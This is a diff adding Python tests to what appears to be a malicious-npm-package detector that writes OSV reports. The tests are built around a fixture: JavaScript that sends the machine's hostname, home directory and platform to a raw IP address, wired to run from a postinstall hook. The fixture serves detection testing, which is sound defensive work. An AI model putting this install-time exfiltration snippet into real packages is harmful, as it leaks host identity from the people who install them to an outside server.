@@ -160,3 +160,31 @@ def test_report_quotes_code_and_cannot_be_injected():
 def test_names():
     assert auto.report_path("@scope/demo-pkg") == "osv/malicious/npm/@scope/demo-pkg/MAL-0000-gatekeeper-scope-demo-pkg.json"
     assert auto.branch_name("@scope/demo-pkg") == "gatekeeper-scope-demo-pkg"
+
+
+PROBE = b"""const os = require('os'), https = require('https');
+const body = JSON.stringify({ host: os.hostname(), home: os.homedir(), platform: process.platform });
+const req = https.request('https://203.0.114.9:8443/', { method: 'POST' });
+req.write(body); req.end();
+"""
+
+
+def _probe_pkg(code: bytes) -> PackageFiles:
+    manifest = b'{"name":"p","version":"1.0.0","scripts":{"postinstall":"node ./index.cjs"}}'
+    files = {"package.json": manifest, "index.cjs": code}
+    return PackageFiles(files=files, sizes={p: len(b) for p, b in files.items()})
+
+
+def test_dependency_confusion_probe_is_proven_statically():
+    ev = auto.install_evidence(_probe_pkg(PROBE), "1.0.0")
+    assert ev is not None and ev.hosts == ["203.0.114.9"]
+    assert any(f.note == "host" for f in ev.facts)
+    assert "the machine's identity" in auto.build_osv("p", [ev], {}, "Muse Spark", datetime(2026, 10, 30, tzinfo=timezone.utc))["details"]
+
+
+def test_one_identity_call_is_not_a_probe():
+    assert auto.install_evidence(_probe_pkg(PROBE.replace(b"home: os.homedir(), ", b"")), "1.0.0") is None
+
+
+def test_identity_sent_to_an_ordinary_domain_is_not_a_probe():
+    assert auto.install_evidence(_probe_pkg(PROBE.replace(b"203.0.114.9:8443", b"telemetry.example.com")), "1.0.0") is None
